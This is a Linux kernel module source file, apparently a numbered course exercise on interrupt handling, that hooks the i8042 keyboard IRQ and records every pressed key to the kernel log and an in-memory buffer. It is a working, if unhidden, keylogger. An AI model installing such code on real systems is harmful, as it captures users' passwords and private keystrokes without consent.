#include <linux/module.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/ioport.h>
#include <asm/io.h>

#define MODULE_NAME "keylog"

#define I8042_K_IRQ 1

#define I8042_DATA_REG 0x60
#define I8042_STATUS_REG 0x64

#define RELEASED_MASK 0x80

#define BUFFER_SIZE 1024



struct keylog_data {
	char buf[BUFFER_SIZE];
	size_t put_idx, get_idx, count;
} k_data;

static int irq = I8042_K_IRQ, irq_counter = 0;

static void put_char(struct keylog_data *kdata, char c) {
	if (kdata->count >= BUFFER_SIZE)
		return;

	kdata->buf[kdata->put_idx] = c;
	kdata->put_idx = (kdata->put_idx + 1) % BUFFER_SIZE;
	kdata->count++;
}

static bool get_char(char *c, struct keylog_data *kdata) {
	if (kdata->count > 0) {
		*c = kdata->buf[kdata->get_idx];
		kdata->get_idx = (kdata->get_idx + 1) % BUFFER_SIZE;
		kdata->count--;
		return true;
	}
	return false;
}

static void reset_buffer(struct keylog_data *kdata)
{
	kdata->count = 0;
	kdata->put_idx = 0;
	kdata->get_idx = 0;
}

static u8 i8042_read_data(void) {
	u8 val;
	val = inb(I8042_DATA_REG);
	return val;       
}

static int is_key_pressed(u8 scancode) {
	return !(scancode & RELEASED_MASK);
}

static int scancode2ascii(u8 scancode) {
	static char *row1 = "1234567890";
	static char *row2 = "qwertyuiop";
	static char *row3 = "asdfghjkl";
	static char *row4 = "zxcvbnm";

	scancode &= ~RELEASED_MASK;
	if (scancode >= 0x02 && scancode <= 0x0b)
		return *(row1 + scancode - 0x02);
	if (scancode >= 0x10 && scancode <= 0x19)
		return *(row2 + scancode - 0x10);
	if (scancode >= 0x1e && scancode <= 0x26)
		return *(row3 + scancode - 0x1e);
	if (scancode >= 0x2c && scancode <= 0x32)
		return *(row4 + scancode - 0x2c);
	if (scancode == 0x39)
		return ' ';
	if (scancode == 0x1c)
		return '\n';
	return '?';
}

static irqreturn_t my_interrupt( int irq, void *dev_id ) {
	u8 scancode = 0;
	int pressed, ch;
	irq_counter++;
	scancode = i8042_read_data();
	ch = scancode2ascii(scancode);
	if (pressed=is_key_pressed(scancode)) {
		printk( KERN_INFO "07.3 - In the ISR: counter = %d, scancode: %d, char: %c pressed\n", \
				irq_counter,scancode,ch );
		struct keylog_data *kdata = (struct keylog_data *)dev_id;
		put_char(kdata, ch);
	} else
		printk( KERN_INFO "07.3 - In the ISR: counter = %d, scancode: %d, char: %c released\n", \
				irq_counter,scancode - RELEASED_MASK, ch );
	return IRQ_NONE; 
}

static int __init my_init( void ) {
	reset_buffer(&k_data);
	if ( request_irq( irq, my_interrupt, IRQF_SHARED, "my_interrupt", &k_data ) )
		return -1;
	printk( KERN_INFO "07.3 - Successfully loading ISR handler on IRQ %d\n", irq );
	if (request_region(I8042_DATA_REG,1,MODULE_NAME) == NULL)
		printk( KERN_INFO "07.3 - Cannot register I/O port region 0x%x\n",I8042_DATA_REG);
	else
		printk( KERN_INFO "07.3 - I/O Port region 0x%x registered\n", I8042_DATA_REG);
	if (request_region(I8042_STATUS_REG,1,MODULE_NAME) == NULL)
		printk( KERN_INFO "07.3 - Cannot register I/O port region 0x%x\n",I8042_STATUS_REG);
	else
		printk( KERN_INFO "07.3 - I/O Port region 0x%x registered\n",I8042_STATUS_REG);
	return 0;
}

static void __exit my_exit( void ) {
	synchronize_irq( irq );
	free_irq( irq, &k_data );
	release_region(I8042_DATA_REG,1);
	release_region(I8042_STATUS_REG,1);
	printk( KERN_INFO "07.3 - Successfully unloading, irq_counter = %d\n", irq_counter );
	k_data.buf[k_data.count]=0;
	printk (KERN_INFO "07-3 - Buffer: [%ld] %s",k_data.count,k_data.buf);
}
module_init( my_init );
module_exit( my_exit );
MODULE_LICENSE( "GPL v2" );
